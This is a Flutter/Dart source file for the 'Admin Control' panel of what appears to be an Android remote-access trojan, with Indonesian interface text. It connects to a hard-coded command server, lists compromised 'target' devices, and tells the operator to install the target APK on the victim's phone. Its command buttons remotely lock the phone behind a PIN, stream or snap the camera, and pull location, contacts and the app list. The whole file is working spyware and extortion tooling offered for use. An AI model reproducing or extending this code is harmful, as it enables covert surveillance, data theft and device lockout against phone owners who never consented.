import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'package:socket_io_client/socket_io_client.dart' as IO;
import 'package:shared_preferences/shared_preferences.dart';

const String SERVER_BASE_URL = 'http://nodeminzxzephyrine.sistems.my.id:2196';

// ============================================================
// 🔥 WARNA MERAH ORANGE PEKAT
// ============================================================
class _C {
  static const primary    = Color(0xFF00E5FF);
  static const secondary  = Color(0xFFFF4500);
  static const accent     = Color(0xFFFF6600);
  static const accentLight= Color(0xFFFF8833);
  static const darkBg     = Color(0xFF1A0A00);
  static const cardBg     = Color(0xFF2A1100);
  static const surface    = Color(0xFF331500);
  static const textWhite  = Color(0xFFFFFFFF);
  static const textGray   = Color(0xFFFF8833);
  static const textMuted  = Color(0xFFCC6633);
}

class AdminControlPage extends StatefulWidget {
  final String sessionKey;
  final String username;  
  final String role;      

  const AdminControlPage({
    super.key,
    required this.sessionKey,
    required this.username, 
    required this.role,     
  });

  @override
  State<AdminControlPage> createState() => _AdminControlPageState();
}

class _AdminControlPageState extends State<AdminControlPage> {
  List<dynamic> targets = [];
  String? selectedTargetId;
  late IO.Socket socket;

  String deviceId = "";
  String permanentAdminId = "";
  bool isLoadingDeviceId = true;

  final TextEditingController lockPinCtrl = TextEditingController(text: "123");
  final TextEditingController lockMsgCtrl = TextEditingController(text: "🔒 SYSTEM LOCKED 🔒\nEnter PIN to unlock");
  final TextEditingController chatMsgCtrl = TextEditingController();

  @override
  void initState() {
    super.initState();
    loadPermanentAdminId();
    fetchTargets();
    initSocket();
  }

  Future<void> loadPermanentAdminId() async {
    SharedPreferences prefs = await SharedPreferences.getInstance();
    String? savedPermanentId = prefs.getString('permanent_admin_id');
    
    if (savedPermanentId != null) {
      setState(() {
        permanentAdminId = savedPermanentId;
        deviceId = savedPermanentId.substring(0, 15).toUpperCase();
        isLoadingDeviceId = false;
      });
    } else {
      setState(() {
        permanentAdminId = widget.sessionKey;
        deviceId = widget.sessionKey.substring(0, 15).toUpperCase();
        isLoadingDeviceId = false;
      });
    }
  }

  void initSocket() {
    socket = IO.io(SERVER_BASE_URL, {
      'transports': ['websocket'],
      'query': {'type': 'admin'}
    });
    socket.connect();
    socket.onConnect((_) => print('Admin socket connected'));
    socket.on('response_update', (data) {
      ScaffoldMessenger.of(context).showSnackBar(
        SnackBar(
          content: Text('Response: ${data['cmd']}'),
          backgroundColor: _C.primary,
          duration: const Duration(seconds: 2)
        )
      );
    });
    socket.on('new_target', (data) {
      fetchTargets();
    });
  }

  Future<void> fetchTargets() async {
    final res = await http.get(
      Uri.parse('$SERVER_BASE_URL/api/list-targets-by-admin?admin_id=$permanentAdminId')
    );
    if (res.statusCode == 200) {
      setState(() => targets = jsonDecode(res.body));
    } else {
      final res2 = await http.get(Uri.parse('$SERVER_BASE_URL/api/list-targets'));
      if (res2.statusCode == 200) {
        final allTargets = jsonDecode(res2.body);
        final myTargets = allTargets.where((t) => t['admin_owner'] == permanentAdminId).toList();
        setState(() => targets = myTargets);
      }
    }
  }

  void copyDeviceIdToClipboard() {
    Clipboard.setData(ClipboardData(text: deviceId));
    ScaffoldMessenger.of(context).showSnackBar(
      const SnackBar(
        content: Text('✅ ID Pairing disalin!'),
        backgroundColor: Color(0xFFCC3300),
        duration: Duration(seconds: 1)
      )
    );
  }

  void sendCommand(String command, {String extra = ''}) {
    if (selectedTargetId == null) {
      ScaffoldMessenger.of(context).showSnackBar(
        const SnackBar(
          content: Text('Pilih target dulu!'),
          backgroundColor: Color(0xFFFF3300)
        )
      );
      return;
    }
    socket.emit('send_command', {'targetId': selectedTargetId, 'command': command, 'extra': extra});
    http.post(Uri.parse('$SERVER_BASE_URL/api/send-command'),
      headers: {'Content-Type': 'application/json'},
      body: jsonEncode({'id': selectedTargetId, 'command': command, 'extra': extra})
    );
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Text('✅ $command -> $selectedTargetId'),
        backgroundColor: _C.primary,
      )
    );
  }

  int getOnlineCount() {
    return targets.where((t) => t['online'] == true).length;
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: _C.darkBg,
      appBar: _buildAppBar(),
      body: SingleChildScrollView(
        padding: const EdgeInsets.all(16),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            _buildOnlineStatusCard(),
            const SizedBox(height: 16),
            _buildDeviceDashboardCard(),
            const SizedBox(height: 16),
            _buildIdPairingCard(),
            const SizedBox(height: 16),
            _buildConnectedDevicesSection(),
          ],
        ),
      ),
    );
  }

  // ============================================================
  // 🔥 SEMUA borderRadius FIXED!
  // ============================================================
  Widget _buildOnlineStatusCard() {
    int onlineCount = getOnlineCount();
    return Container(
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        color: onlineCount > 0 ? _C.primary.withOpacity(0.3) : _C.surface,
        borderRadius: BorderRadius.circular(16),
        border: Border.all(
          color: onlineCount > 0 ? _C.secondary : _C.textMuted,
          width: 1,
        ),
      ),
      child: Row(
        children: [
          Container(
            width: 12,
            height: 12,
            decoration: BoxDecoration(
              color: onlineCount > 0 ? _C.secondary : _C.textMuted,
              shape: BoxShape.circle,
            ),
          ),
          const SizedBox(width: 12),
          Text(
            onlineCount > 0 ? "ONLINE" : "OFFLINE",
            style: TextStyle(
              color: onlineCount > 0 ? _C.secondary : _C.textMuted,
              fontWeight: FontWeight.bold,
              fontSize: 16,
              letterSpacing: 1,
            ),
          ),
          const Spacer(),
          Text(
            "$onlineCount Device Terhubung",
            style: TextStyle(color: _C.textGray, fontSize: 12),
          ),
        ],
      ),
    );
  }

  Widget _buildDeviceDashboardCard() {
    return Container(
      padding: const EdgeInsets.all(20),
      decoration: BoxDecoration(
        color: _C.cardBg,
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: _C.primary.withOpacity(0.3)),
        boxShadow: [
          BoxShadow(
            color: _C.primary.withOpacity(0.1),
            blurRadius: 10,
          ),
        ],
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              Icon(Icons.dashboard, color: _C.secondary, size: 24),
              const SizedBox(width: 12),
              Text(
                "DEVICE DASHBOARD",
                style: TextStyle(
                  color: _C.textWhite,
                  fontWeight: FontWeight.bold,
                  fontSize: 16,
                  letterSpacing: 1,
                ),
              ),
              const Spacer(),
              Container(
                padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 4),
                decoration: BoxDecoration(
                  color: _C.primary.withOpacity(0.2),
                  borderRadius: BorderRadius.circular(12),
                  border: Border.all(color: _C.primary.withOpacity(0.3)),
                ),
                child: Text(
                  "@${permanentAdminId.substring(0, 6)}",
                  style: TextStyle(color: _C.secondary, fontSize: 12),
                ),
              ),
            ],
          ),
          const SizedBox(height: 20),
          Row(
            mainAxisAlignment: MainAxisAlignment.spaceBetween,
            children: [
              _buildStatItem(Icons.link, "TOTAL", "${targets.length}"),
              _buildStatItem(Icons.copy, "SALIN", "ID"),
            ],
          ),
        ],
      ),
    );
  }

  Widget _buildStatItem(IconData icon, String label, String value) {
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 12),
      decoration: BoxDecoration(
        color: _C.darkBg,
        borderRadius: BorderRadius.circular(12),
        border: Border.all(color: _C.primary.withOpacity(0.2)),
      ),
      child: Column(
        children: [
          Icon(icon, color: _C.textGray, size: 20),
          const SizedBox(height: 4),
          Text(
            label,
            style: TextStyle(color: _C.textMuted, fontSize: 11),
          ),
          Text(
            value,
            style: TextStyle(
              color: _C.textWhite,
              fontWeight: FontWeight.bold,
              fontSize: 20,
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildIdPairingCard() {
    return GestureDetector(
      onTap: copyDeviceIdToClipboard,
      child: Container(
        padding: const EdgeInsets.all(20),
        decoration: BoxDecoration(
          gradient: LinearGradient(
            colors: [_C.primary, _C.secondary],
            begin: Alignment.topLeft,
            end: Alignment.bottomRight,
          ),
          borderRadius: BorderRadius.circular(20),
          boxShadow: [
            BoxShadow(
              color: _C.secondary.withOpacity(0.3),
              blurRadius: 15,
              spreadRadius: 3,
            ),
          ],
        ),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            const Text(
              "ID PAIRING (bagikan ke target)",
              style: TextStyle(color: Colors.white70, fontSize: 12),
            ),
            const SizedBox(height: 12),
            Row(
              children: [
                Expanded(
                  child: Text(
                    isLoadingDeviceId ? "Loading..." : deviceId,
                    style: const TextStyle(
                      color: Colors.white,
                      fontWeight: FontWeight.bold,
                      fontSize: 20,
                      letterSpacing: 2,
                      fontFamily: 'monospace',
                    ),
                  ),
                ),
                Container(
                  padding: const EdgeInsets.all(8),
                  decoration: BoxDecoration(
                    color: Colors.white.withOpacity(0.2),
                    borderRadius: BorderRadius.circular(8),
                  ),
                  child: const Icon(Icons.copy, color: Colors.white, size: 20),
                ),
              ],
            ),
            const SizedBox(height: 12),
            const Text("Tap untuk menyalin ID", style: TextStyle(color: Colors.white60)),
          ],
        ),
      ),
    );
  }

  Widget _buildConnectedDevicesSection() {
    return Container(
      decoration: BoxDecoration(
        color: _C.cardBg,
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: _C.primary.withOpacity(0.3)),
      ),
      child: Column(
        children: [
          Container(
            padding: const EdgeInsets.all(16),
            decoration: const BoxDecoration(
              border: Border(
                bottom: BorderSide(color: Colors.white10),
              ),
            ),
            child: Row(
              children: [
                Icon(Icons.devices, color: _C.secondary),
                const SizedBox(width: 12),
                Text(
                  "CONNECTED DEVICES",
                  style: TextStyle(
                    color: _C.textWhite,
                    fontWeight: FontWeight.bold,
                  ),
                ),
                const Spacer(),
                Text(
                  "${targets.length} Total",
                  style: TextStyle(color: _C.textMuted),
                ),
              ],
            ),
          ),
          targets.isEmpty
              ? _buildEmptyDevices()
              : ListView.builder(
                  shrinkWrap: true,
                  physics: const NeverScrollableScrollPhysics(),
                  itemCount: targets.length,
                  itemBuilder: (context, index) {
                    final device = targets[index];
                    final isOnline = device['online'] == true;
                    return _buildDeviceTile(device, isOnline);
                  },
                ),
          Container(
            padding: const EdgeInsets.all(16),
            child: Column(
              children: [
                Text(
                  "Cara hubungan device:",
                  style: TextStyle(color: _C.textGray),
                ),
                const SizedBox(height: 8),
                Text(
                  "1. install APK target di HP korban",
                  style: TextStyle(color: _C.textMuted, fontSize: 12),
                ),
                Text(
                  "2. Buka APK → masukkan ID Pairing di atas",
                  style: TextStyle(color: _C.textMuted, fontSize: 12),
                ),
                Text(
                  "3. Device otomatis muncul di sini",
                  style: TextStyle(color: _C.textMuted, fontSize: 12),
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildEmptyDevices() {
    return Container(
      padding: const EdgeInsets.symmetric(vertical: 40),
      child: Column(
        children: [
          Icon(Icons.mobile_off, color: _C.textMuted.withOpacity(0.3), size: 48),
          Text(
            "NO DEVICES",
            style: TextStyle(color: _C.textMuted.withOpacity(0.5)),
          ),
          Text(
            "Belum ada device terhubung",
            style: TextStyle(color: _C.textMuted.withOpacity(0.5)),
          ),
        ],
      ),
    );
  }

  Widget _buildDeviceTile(Map<String, dynamic> device, bool isOnline) {
    return Container(
      margin: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
      padding: const EdgeInsets.all(12),
      decoration: BoxDecoration(
        color: isOnline ? _C.secondary.withOpacity(0.1) : _C.darkBg,
        borderRadius: BorderRadius.circular(12),
        border: Border.all(
          color: isOnline ? _C.secondary.withOpacity(0.3) : _C.textMuted.withOpacity(0.1),
        ),
      ),
      child: Row(
        children: [
          Container(
            width: 40,
            height: 40,
            decoration: BoxDecoration(
              color: isOnline ? _C.secondary.withOpacity(0.2) : _C.textMuted.withOpacity(0.1),
              borderRadius: BorderRadius.circular(12),
            ),
            child: Icon(
              Icons.phone_android,
              color: isOnline ? _C.secondary : _C.textMuted,
            ),
          ),
          const SizedBox(width: 12),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(
                  device['model']?.toString() ?? 'Unknown Device',
                  style: TextStyle(color: _C.textWhite),
                ),
                Row(
                  children: [
                    Container(
                      width: 6,
                      height: 6,
                      decoration: BoxDecoration(
                        color: isOnline ? _C.secondary : _C.textMuted,
                        shape: BoxShape.circle,
                      ),
                    ),
                    const SizedBox(width: 6),
                    Text(
                      isOnline ? "Online" : "Offline",
                      style: TextStyle(
                        color: isOnline ? _C.secondary : _C.textMuted,
                      ),
                    ),
                  ],
                ),
              ],
            ),
          ),
          if (isOnline)
            GestureDetector(
              onTap: () {
                selectedTargetId = device['id']?.toString();
                _showCommandPanel(device);
              },
              child: Container(
                padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
                decoration: BoxDecoration(
                  color: _C.primary.withOpacity(0.2),
                  borderRadius: BorderRadius.circular(20),
                  border: Border.all(color: _C.primary.withOpacity(0.3)),
                ),
                child: Text(
                  "CONTROL",
                  style: TextStyle(color: _C.secondary),
                ),
              ),
            ),
        ],
      ),
    );
  }

  void _showCommandPanel(Map<String, dynamic> device) {
    selectedTargetId = device['id']?.toString();
    showModalBottomSheet(
      context: context,
      isScrollControlled: true,
      backgroundColor: Colors.transparent,
      builder: (context) => Container(
        height: MediaQuery.of(context).size.height * 0.8,
        decoration: BoxDecoration(
          color: _C.darkBg,
          borderRadius: const BorderRadius.vertical(top: Radius.circular(20)),
          border: Border.all(color: _C.primary.withOpacity(0.3)),
        ),
        child: Column(
          children: [
            Container(
              padding: const EdgeInsets.all(16),
              child: Row(
                children: [
                  Container(
                    width: 40,
                    height: 40,
                    decoration: BoxDecoration(
                      color: _C.secondary.withOpacity(0.2),
                      borderRadius: BorderRadius.circular(12),
                    ),
                    child: Icon(Icons.phone_android, color: _C.secondary),
                  ),
                  const SizedBox(width: 12),
                  Expanded(
                    child: Text(
                      device['model']?.toString() ?? 'Unknown Device',
                      style: TextStyle(color: _C.textWhite),
                    ),
                  ),
                  IconButton(
                    onPressed: () => Navigator.pop(context),
                    icon: Icon(Icons.close, color: _C.textWhite),
                  ),
                ],
              ),
            ),
            Expanded(
              child: SingleChildScrollView(
                padding: const EdgeInsets.all(16),
                child: Column(
                  children: _buildCommandGridContent(),
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }

  List<Widget> _buildCommandGridContent() {
    final categories = [
      _CommandCategory('🔒 LOCK', Icons.lock_outline, [
        _CommandItem('HARD LOCK', () => sendCommand('hard_lock', extra: '${lockMsgCtrl.text}|${lockPinCtrl.text}'), Icons.lock, _C.primary),
        _CommandItem('UNLOCK', () => sendCommand('unlock'), Icons.lock_open, _C.secondary),
        _CommandItem('CHAT', () => sendCommand('chat_to_target', extra: chatMsgCtrl.text), Icons.chat, _C.accent),
      ]),
      _CommandCategory('📷 CAMERA', Icons.camera_alt, [
        _CommandItem('LIVE CAM', () => sendCommand('start_live_camera'), Icons.videocam, _C.accent),
        _CommandItem('STOP LIVE', () => sendCommand('stop_live_camera'), Icons.stop, Colors.orange),
        _CommandItem('PHOTO', () => sendCommand('take_photo'), Icons.camera, Colors.teal),
      ]),
      _CommandCategory('📍 DATA', Icons.data_usage, [
        _CommandItem('LOCATION', () => sendCommand('get_location'), Icons.location_on, Colors.teal),
        _CommandItem('CONTACTS', () => sendCommand('get_contacts'), Icons.contacts, Colors.indigo),
        _CommandItem('APPS', () => sendCommand('get_apps'), Icons.apps, Colors.purple),
      ]),
      _CommandCategory('🎬 MEDIA', Icons.audiotrack, [
        _CommandItem('PLAY MP3', () => sendCommand('play_audio'), Icons.play_arrow, Colors.deepOrange),
        _CommandItem('STOP MP3', () => sendCommand('stop_audio'), Icons.stop, Colors.grey),
      ]),
      _CommandCategory('⚙️ SYSTEM', Icons.settings, [
        _CommandItem('FLASH ON', () => sendCommand('flash_strobe'), Icons.flash_on, Colors.amber),
        _CommandItem('FLASH OFF', () => sendCommand('stop_strobe'), Icons.flash_off, Colors.grey),
        _CommandItem('VIBRATE', () => sendCommand('vibrate_device'), Icons.vibration, Colors.purple),
      ]),
    ];

    List<Widget> widgets = [];
    for (var cat in categories) {
      widgets.add(_buildCategoryCard(cat));
      widgets.add(const SizedBox(height: 12));
    }
    return widgets;
  }

  Widget _buildCategoryCard(_CommandCategory cat) {
    return Container(
      decoration: BoxDecoration(
        color: _C.cardBg,
        borderRadius: BorderRadius.circular(16),
        border: Border.all(color: _C.primary.withOpacity(0.2)),
      ),
      child: Column(
        children: [
          Container(
            padding: const EdgeInsets.all(12),
            child: Row(
              children: [
                Icon(cat.icon, color: _C.secondary),
                const SizedBox(width: 8),
                Text(
                  cat.title,
                  style: TextStyle(color: _C.textWhite),
                ),
              ],
            ),
          ),
          Padding(
            padding: const EdgeInsets.all(12),
            child: Wrap(
              spacing: 8,
              runSpacing: 8,
              children: cat.items.map((item) => _buildCommandButton(item)).toList(),
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildCommandButton(_CommandItem item) {
    return ElevatedButton(
      onPressed: item.onPressed,
      style: ElevatedButton.styleFrom(
        backgroundColor: _C.darkBg,
        foregroundColor: item.color,
        padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(20)),
        side: BorderSide(color: item.color.withOpacity(0.3)),
      ),
      child: Row(
        mainAxisSize: MainAxisSize.min,
        children: [
          Icon(item.icon, size: 14),
          const SizedBox(width: 4),
          Text(item.label),
        ],
      ),
    );
  }

  PreferredSizeWidget _buildAppBar() {
    return AppBar(
      title: Text(
        'ADMIN CONTROL',
        style: TextStyle(
          color: _C.secondary,
          fontFamily: 'Orbitron',
          fontWeight: FontWeight.bold,
          letterSpacing: 1,
        ),
      ),
      backgroundColor: _C.darkBg,
      elevation: 6,
      shadowColor: _C.primary.withOpacity(0.6),
      actions: [
        IconButton(
          onPressed: fetchTargets,
          icon: Icon(Icons.refresh, color: _C.secondary),
        ),
      ],
    );
  }

  @override
  void dispose() {
    socket.disconnect();
    lockPinCtrl.dispose();
    lockMsgCtrl.dispose();
    chatMsgCtrl.dispose();
    super.dispose();
  }
}

class _CommandCategory {
  final String title;
  final IconData icon;
  final List<_CommandItem> items;
  _CommandCategory(this.title, this.icon, this.items);
}

class _CommandItem {
  final String label;
  final VoidCallback onPressed;
  final IconData icon;
  final Color color;
  _CommandItem(this.label, this.onPressed, this.icon, this.color);
}